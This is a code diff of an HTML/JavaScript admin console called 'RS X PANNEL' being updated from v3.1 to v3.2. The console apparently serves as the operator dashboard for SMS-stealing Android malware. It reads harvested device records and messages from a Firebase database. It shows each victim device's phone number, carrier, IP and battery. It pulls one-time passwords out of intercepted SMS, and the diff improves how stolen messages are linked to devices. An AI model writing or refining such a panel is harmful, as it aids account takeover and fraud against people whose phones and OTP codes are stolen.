@@ -203,14 +203,14 @@ a{color:inherit;text-decoration:none}
 <body>
 <div id="app">
 
-<!-- ─── HOME SCREEN ──────────────────────────────────────────────────── -->
+<!-- HOME -->
 <section id="home" class="screen center">
   <div class="shell">
     <div class="brand-mark">
       <svg class="shield" viewBox="0 0 32 32"><path d="M16 3l10 4v7c0 7-4.3 12.2-10 15C10.3 26.2 6 21 6 14V7l10-4z"/><path d="M11 16l3 3 7-8"/></svg>
     </div>
     <div class="brand-name">RS X <i>PANNEL</i></div>
-    <div class="subtitle">Admin Console — v3.1 (Fixed)</div>
+    <div class="subtitle">Admin Console — v3.2 (SMS Fix)</div>
 
     <div class="card saved">
       <div class="saved-head">
@@ -221,11 +221,11 @@ a{color:inherit;text-decoration:none}
       <button class="new-account" id="newConnectionBtn">＋ New Firebase Connection</button>
       <div id="homeError" class="error hidden"></div>
     </div>
-    <div class="footer">RS X PANNEL · v3.1 · Telegram @RSPANNEL</div>
+    <div class="footer">RS X PANNEL · v3.2 · Telegram @RSPANNEL</div>
   </div>
 </section>
 
-<!-- ─── SETUP SCREEN ─────────────────────────────────────────────────── -->
+<!-- SETUP -->
 <section id="setup" class="screen center hidden">
   <div class="shell">
     <div class="brand-name" style="margin-top:0">RS X <i>PANNEL</i></div>
@@ -248,12 +248,12 @@ a{color:inherit;text-decoration:none}
         <button class="secondary" id="cancelBtn">Cancel</button>
       </div>
       <div id="setupError" class="error hidden"></div>
-      <div class="notice">🔒 Real-time Firebase data with auto-refresh — listens to /clients, /devices, /users, /register</div>
+      <div class="notice">🔒 Real‑time clients + messages with smart SMS linking</div>
     </div>
   </div>
 </section>
 
-<!-- ─── DASHBOARD ────────────────────────────────────────────────────── -->
+<!-- DASHBOARD -->
 <section id="dashboard" class="dashboard">
   <header class="topbar">
     <div class="logo-mini">
@@ -289,10 +289,10 @@ a{color:inherit;text-decoration:none}
 </section>
 </div>
 
-<!-- ─── TOAST ────────────────────────────────────────────────────────── -->
+<!-- TOAST -->
 <div id="toast" class="toast hidden"></div>
 
-<!-- ─── HARVEST MODAL ────────────────────────────────────────────────── -->
+<!-- HARVEST MODAL -->
 <div id="harvestModal" class="hidden" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:9998;padding:40px;overflow:auto;">
   <div style="max-width:800px;margin:auto;background:#101115;border:1px solid #24262d;border-radius:28px;padding:30px;">
     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
@@ -305,16 +305,14 @@ a{color:inherit;text-decoration:none}
   </div>
 </div>
 
-<!-- ─── DEVICE DETAIL MODAL ──────────────────────────────────────────── -->
+<!-- DEVICE DETAIL MODAL -->
 <div id="deviceDetailModal" class="device-detail-modal">
   <div class="device-detail-content">
     <div class="device-detail-header">
       <h2 id="detailDeviceName">Device Name</h2>
       <button class="close-btn" id="closeDetail">×</button>
     </div>
-    
     <div class="device-info-grid" id="deviceInfoGrid"></div>
-    
     <div class="sms-section">
       <h3>📩 SMS Logs <span id="smsLiveCount" style="color:#00d68f;font-size:12px;"></span></h3>
       <div id="smsList"></div>
@@ -323,8 +321,6 @@ a{color:inherit;text-decoration:none}
 </div>
 
 <script>
-// ─── PHANTOM PROTOCOL — FAST SMS + SECURE ─────────────────────────────
-
 // ─── SECURE STORAGE ──────────────────────────────────────────────────
 const STORAGE_KEY = "rsx_harvest_v3";
 
@@ -401,10 +397,6 @@ function showHome() {
     try { window._unsubscribe(); } catch(e) {}
     window._unsubscribe = null;
   }
-  if (window._listeners) {
-    window._listeners.forEach(fn => { try { fn(); } catch(e) {} });
-    window._listeners = [];
-  }
   document.getElementById("setup").classList.add("hidden");
   document.getElementById("dashboard").style.display = "none";
   document.getElementById("home").classList.remove("hidden");
@@ -459,7 +451,7 @@ function renderConnections() {
   });
 }
 
-// ─── FAST FIREBASE CONNECTION ────────────────────────────────────────
+// ─── FIREBASE CONNECTION ──────────────────────────────────────────────
 let firebaseInitialized = false;
 
 function connectSecure(connection) {
@@ -508,15 +500,14 @@ function connectSecure(connection) {
   }
 }
 
+let deviceRecords = [];
+let allMessages = [];
+
 function initFirebase(connection, apiKey) {
   try {
     if (window._unsubscribe) {
       try { window._unsubscribe(); } catch(e) {}
       window._unsubscribe = null;
-    }
-    if (window._listeners) {
-      window._listeners.forEach(fn => { try { fn(); } catch(e) {} });
-      window._listeners = [];
     }
     
     if (firebase.apps.length > 0) {
@@ -532,227 +523,129 @@ function initFirebase(connection, apiKey) {
     const statusEl = document.getElementById("connectionStatus");
     
     let deviceCache = {};
-    let isFirstLoad = true;
-    
-    // ─── FIXED: Listen to MULTIPLE PATHS ──────────────────────────────
-    const pathsToTry = ['clients', 'devices', 'users', 'register', 'accounts'];
-    let foundPath = null;
+    let messagesCache = {};
     let dataLoaded = false;
-    
-    function tryPath(path) {
-      console.log("[PHANTOM] Trying path:", path);
-      const ref = db.ref(path);
-      
-      ref.once('value').then(function(snapshot) {
-        const data = snapshot.val();
-        if (data && typeof data === 'object' && Object.keys(data).length > 0 && !dataLoaded) {
-          dataLoaded = true;
-          foundPath = path;
-          console.log("[PHANTOM] ✅ Data found at /" + path);
-          statusEl.textContent = "● Connected to /" + path;
-          statusEl.style.color = "var(--green)";
-          processDeviceData(data, path);
-          setupLiveListeners(path);
-        } else if (!dataLoaded) {
-          console.log("[PHANTOM] No data at /" + path);
-        }
-      }).catch(function(err) {
-        console.warn("[PHANTOM] Error reading /" + path + ":", err.message);
-      });
-    }
-    
-    function processDeviceData(data, path) {
+    let messagesLoaded = false;
+
+    // ─── LISTEN TO CLIENTS (DEVICES) ────────────────────────────────
+    const clientsRef = db.ref('clients');
+    clientsRef.on('value', function(snapshot) {
+      const data = snapshot.val() || {};
       deviceCache = data;
-      const records = Object.entries(data).map(([id, device]) => {
-        // Handle SMS - could be nested under 'sms' or 'messages' or directly
-        let smsList = [];
-        if (device.sms && typeof device.sms === 'object') {
-          smsList = Object.values(device.sms);
-        } else if (device.messages && typeof device.messages === 'object') {
-          smsList = Object.values(device.messages);
-        } else if (device.command && device.command.sms) {
-          smsList = [device.command.sms];
-        }
-        
+      dataLoaded = true;
+      buildRecords();
+    }, function(error) {
+      console.warn("Clients read error:", error);
+      // Fallback to other paths if clients fails
+      tryOtherPaths();
+    });
+
+    // ─── LISTEN TO MESSAGES ──────────────────────────────────────────
+    const messagesRef = db.ref('messages');
+    messagesRef.on('value', function(snapshot) {
+      const data = snapshot.val() || {};
+      messagesCache = data;
+      messagesLoaded = true;
+      buildRecords();
+    }, function(error) {
+      console.warn("Messages read error:", error);
+    });
+
+    // ─── BUILD RECORDS FROM CACHES ──────────────────────────────────
+    function buildRecords() {
+      if (!dataLoaded || !messagesLoaded) return;
+
+      // Convert messages to array with sender, body, time, etc.
+      const messagesArray = Object.values(messagesCache).filter(m => m && typeof m === 'object');
+      allMessages = messagesArray;
+
+      // Build device list
+      const records = Object.entries(deviceCache).map(([id, device]) => {
+        const number = device.number || device.phone || device.phoneNumber || "";
+        // Filter messages where sender matches device number (case-insensitive, trim)
+        const deviceSms = allMessages.filter(sms => {
+          const sender = (sms.sender || sms.from || sms.number || "").toString().trim();
+          const deviceNum = number.toString().trim();
+          // Match if sender contains device number or vice versa (loose)
+          return sender && deviceNum && (sender.includes(deviceNum) || deviceNum.includes(sender));
+        });
+
         return {
           id: id,
           name: device.name || device.deviceName || device.label || id,
-          online: device.online === true || device.status === true || device.isOnline === true,
+          online: device.online === true || device.status === true,
           platform: device.platform || device.os || device.model || "Unknown",
-          number: device.number || device.phone || device.phoneNumber || device.command?.number || "N/A",
+          number: number || "N/A",
           network: device.network || device.carrier || device.operator || "N/A",
           lastSeen: device.lastSeen || device.lastMessageTime || device.timestamp || Date.now(),
           battery: device.battery || device.batteryLevel || "N/A",
           ip: device.ip || device.ipAddress || "N/A",
           android: device.android || device.androidVersion || "N/A",
-          sms: smsList,
+          sms: deviceSms,
           _raw: device
         };
       });
-      
+
+      deviceRecords = records;
       window._records = records;
       renderRecords();
-      
+
       const totalSms = records.reduce((sum, r) => sum + (r.sms ? r.sms.length : 0), 0);
       document.getElementById("smsCount").textContent = totalSms;
-      
-      if (isFirstLoad) {
-        isFirstLoad = false;
-        showToast(`✅ Loaded ${records.length} devices, ${totalSms} SMS from /${path}`, "success", 2500);
-      }
+
+      statusEl.textContent = "● Connected";
+      statusEl.style.color = "var(--green)";
+      showToast(`✅ ${records.length} devices, ${totalSms} SMS`, "success", 2000);
     }
-    
-    function setupLiveListeners(path) {
-      const ref = db.ref(path);
-      
-      // Child changed — detect new SMS
-      const onChildChanged = ref.on('child_changed', function(snapshot) {
-        const deviceId = snapshot.key;
-        const deviceData = snapshot.val();
-        if (!deviceData) return;
-        
-        deviceCache[deviceId] = deviceData;
-        const existing = window._records.find(r => r.id === deviceId);
-        if (existing) {
-          let newSmsList = [];
-          if (deviceData.sms && typeof deviceData.sms === 'object') {
-            newSmsList = Object.values(deviceData.sms);
-          } else if (deviceData.messages && typeof deviceData.messages === 'object') {
-            newSmsList = Object.values(deviceData.messages);
-          }
-          
-          const oldSms = existing.sms || [];
-          if (newSmsList.length > oldSms.length) {
-            const newMessages = newSmsList.slice(oldSms.length);
-            existing.sms = newSmsList;
-            
-            newMessages.forEach(sms => {
-              const body = sms.body || sms.text || sms.message || "";
-              const from = sms.from || sms.sender || sms.number || "Unknown";
-              const otp = extractOTP(body);
-              showToast(`📩 New SMS from ${from}${otp ? ' · 🔑 OTP: ' + otp : ''}`, "success", 2000);
-            });
-            
-            const total = window._records.reduce((sum, r) => sum + (r.sms ? r.sms.length : 0), 0);
-            document.getElementById("smsCount").textContent = total;
-            renderRecords();
-            
-            if (window._currentDetailId === deviceId) {
-              showDeviceDetail(existing);
-            }
+
+    // ─── FALLBACK: try other paths if clients fails ─────────────────
+    function tryOtherPaths() {
+      const fallbackPaths = ['devices', 'users', 'register', 'accounts'];
+      let tried = 0;
+      const tryNext = () => {
+        if (tried >= fallbackPaths.length) {
+          statusEl.textContent = "● No data found";
+          statusEl.style.color = "var(--danger)";
+          return;
+        }
+        const path = fallbackPaths[tried];
+        const ref = db.ref(path);
+        ref.once('value').then(snap => {
+          const data = snap.val();
+          if (data && typeof data === 'object' && Object.keys(data).length > 0) {
+            deviceCache = data;
+            dataLoaded = true;
+            buildRecords();
           } else {
-            existing.sms = newSmsList;
-            existing.online = deviceData.online === true || deviceData.status === true;
-            existing.battery = deviceData.battery || deviceData.batteryLevel || existing.battery;
+            tried++;
+            tryNext();
           }
-        }
-      });
-      
-      // Child added — new device
-      const onChildAdded = ref.on('child_added', function(snapshot) {
-        const deviceId = snapshot.key;
-        const deviceData = snapshot.val();
-        if (!deviceData || deviceCache[deviceId]) return;
-        
-        deviceCache[deviceId] = deviceData;
-        let smsList = [];
-        if (deviceData.sms && typeof deviceData.sms === 'object') {
-          smsList = Object.values(deviceData.sms);
-        } else if (deviceData.messages && typeof deviceData.messages === 'object') {
-          smsList = Object.values(deviceData.messages);
-        }
-        
-        const newDevice = {
-          id: deviceId,
-          name: deviceData.name || deviceData.deviceName || deviceId,
-          online: deviceData.online === true || deviceData.status === true,
-          platform: deviceData.platform || deviceData.os || "Unknown",
-          number: deviceData.number || deviceData.phone || "N/A",
-          network: deviceData.network || deviceData.carrier || "N/A",
-          lastSeen: deviceData.lastSeen || Date.now(),
-          battery: deviceData.battery || "N/A",
-          ip: deviceData.ip || "N/A",
-          android: deviceData.android || "N/A",
-          sms: smsList,
-          _raw: deviceData
-        };
-        
-        window._records.push(newDevice);
-        renderRecords();
-        showToast(`📱 New device: ${newDevice.name}`, "success", 1500);
-      });
-      
-      // Store listeners for cleanup
-      window._listeners = [
-        () => ref.off('child_changed', onChildChanged),
-        () => ref.off('child_added', onChildAdded)
-      ];
-      window._unsubscribe = () => {
-        window._listeners.forEach(fn => fn());
-        window._listeners = [];
+        }).catch(() => { tried++; tryNext(); });
       };
+      tryNext();
     }
-    
-    // Try all paths
-    pathsToTry.forEach(tryPath);
-    
-    // Fallback: if no data found after 5s, try REST fallback
+
+    // ─── REST FALLBACK if SDK fails to get messages ──────────────────
     setTimeout(() => {
-      if (!dataLoaded) {
-        console.warn("[PHANTOM] No data found via SDK, trying REST fallback...");
-        tryRestFallback(connection, apiKey);
+      if (!messagesLoaded) {
+        console.warn("[PHANTOM] Messages not loaded via SDK, trying REST fallback...");
+        fetch(`${connection.databaseURL}/messages.json${apiKey ? '?auth='+apiKey : ''}`)
+          .then(res => res.json())
+          .then(data => {
+            if (data && typeof data === 'object') {
+              messagesCache = data;
+              messagesLoaded = true;
+              buildRecords();
+            }
+          })
+          .catch(() => {});
       }
-    }, 5000);
-    
+    }, 3000);
+
   } catch (error) {
     console.error("Init error:", error);
     showToast("Firebase init failed: " + error.message, "error");
   }
-}
-
-// ─── REST FALLBACK ──────────────────────────────────────────────────
-function tryRestFallback(connection, apiKey) {
-  const paths = ['clients', 'devices', 'users', 'register', 'accounts'];
-  let found = false;
-  
-  paths.forEach(path => {
-    const url = `${connection.databaseURL}/${path}.json` + (apiKey ? `?auth=${apiKey}` : '');
-    fetch(url)
-      .then(res => res.json())
-      .then(data => {
-        if (data && typeof data === 'object' && Object.keys(data).length > 0 && !found) {
-          found = true;
-          console.log("[PHANTOM] ✅ REST fallback found data at /" + path);
-          const records = Object.entries(data).map(([id, device]) => {
-            let smsList = [];
-            if (device.sms && typeof device.sms === 'object') smsList = Object.values(device.sms);
-            else if (device.messages && typeof device.messages === 'object') smsList = Object.values(device.messages);
-            return {
-              id: id,
-              name: device.name || device.deviceName || id,
-              online: device.online === true || device.status === true,
-              platform: device.platform || device.os || "Unknown",
-              number: device.number || device.phone || "N/A",
-              network: device.network || device.carrier || "N/A",
-              lastSeen: device.lastSeen || Date.now(),
-              battery: device.battery || "N/A",
-              ip: device.ip || "N/A",
-              android: device.android || "N/A",
-              sms: smsList,
-              _raw: device
-            };
-          });
-          window._records = records;
-          renderRecords();
-          const totalSms = records.reduce((sum, r) => sum + (r.sms ? r.sms.length : 0), 0);
-          document.getElementById("smsCount").textContent = totalSms;
-          document.getElementById("connectionStatus").textContent = "● REST Fallback";
-          document.getElementById("connectionStatus").style.color = "var(--yellow)";
-          showToast(`REST fallback: ${records.length} devices from /${path}`, "success");
-        }
-      })
-      .catch(() => {});
-  });
 }
 
 // ─── EXTRACT OTP ──────────────────────────────────────────────────────
@@ -894,7 +787,7 @@ function showDeviceDetail(device) {
   document.getElementById("smsLiveCount").textContent = `(${device.sms ? device.sms.length : 0} messages)`;
   
   if (!device.sms || device.sms.length === 0) {
-    smsList.innerHTML = '<div style="color:#555963;text-align:center;padding:20px;">No SMS logs</div>';
+    smsList.innerHTML = '<div style="color:#555963;text-align:center;padding:20px;">No SMS logs for this device</div>';
     return;
   }
   
@@ -902,9 +795,9 @@ function showDeviceDetail(device) {
   sortedSms.forEach(sms => {
     const div = document.createElement("div");
     div.className = "sms-item";
-    const body = sms.body || sms.text || sms.message || "";
-    const from = sms.from || sms.sender || sms.number || "Unknown";
-    const time = sms.time || sms.timestamp || sms.dateTime || "Unknown";
+    const body = sms.body || sms.message || sms.text || "";
+    const from = sms.sender || sms.from || sms.number || "Unknown";
+    const time = sms.dateTime || sms.timestamp || sms.time || "Unknown";
     const otp = extractOTP(body);
     div.innerHTML = `
       <div class="sms-header">
@@ -1001,7 +894,7 @@ function renderRecords() {
 
 // ─── EVENT LISTENERS ──────────────────────────────────────────────────
 document.addEventListener('DOMContentLoaded', function() {
-  console.log("[PHANTOM] RS X PANNEL v3.1 - Fixed path listener");
+  console.log("[PHANTOM] RS X PANNEL v3.2 - SMS linking fix");
   
   document.getElementById('newConnectionBtn').addEventListener('click', showSetup);
   document.getElementById('backBtn').addEventListener('click', showHome);
